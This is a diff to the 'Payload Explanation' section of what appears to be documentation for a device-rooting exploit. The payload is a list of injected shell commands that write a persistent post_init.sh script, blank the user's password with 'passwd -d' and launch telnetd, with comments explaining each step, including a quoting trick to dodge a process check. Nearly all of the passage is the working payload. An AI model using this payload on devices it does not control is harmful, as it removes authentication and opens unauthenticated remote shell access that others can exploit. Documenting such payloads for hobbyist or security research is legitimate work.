@@ -57,18 +57,16 @@ Payload Explanation
 ---------------
 ```python
 payload=[
-    'x="fw_man"ager.sh',                    # Workaround - Script checks if it's already running by grepping ps.
     'y=/data/scripts/post_init.sh',         
-    '$x -t -f',                             # Create default /data/scripts/post_init.sh
-    'z=`agetprop persist.app.bind_key`',    # post_init below exploits bind_key for additional storage
-    'echo -e $z>$y',                        # Write the contents to /data/scripts/post_init.sh
-    'tail -n2 $y|sh'                        # Clear $USER password, enable tty and start telnetd
+    '"fw_man"ager.sh -t -f',                        # Create default /data/scripts/post_init.sh
+    'echo -e `agetprop persist.app.bind_key`>$y',   # Write post_init[] content below to post_init.sh
+    'tail -n2 $y|sh'                                # Clear $USER password, enable tty and start telnetd
 ],
 post_init = [
-    '#\\x21/bin/sh',                        # Due to 'echo -e' in payload we need to ensure ! is not evaluated
-    'fw_manager.sh -r',                     # Start firmware as normal
-    'passwd -d $USER',                      # Clear $USER password
-    'fw_manager.sh -t -k'                   # Enable tty and start telnetd
+    '#!/bin/sh',
+    'fw_manager.sh -r',                             # Start firmware as normal
+    'passwd -d $USER',                              # Clear $USER password
+    'fw_manager.sh -t -k'                           # Enable tty and start telnetd
 ],
 }
 ```
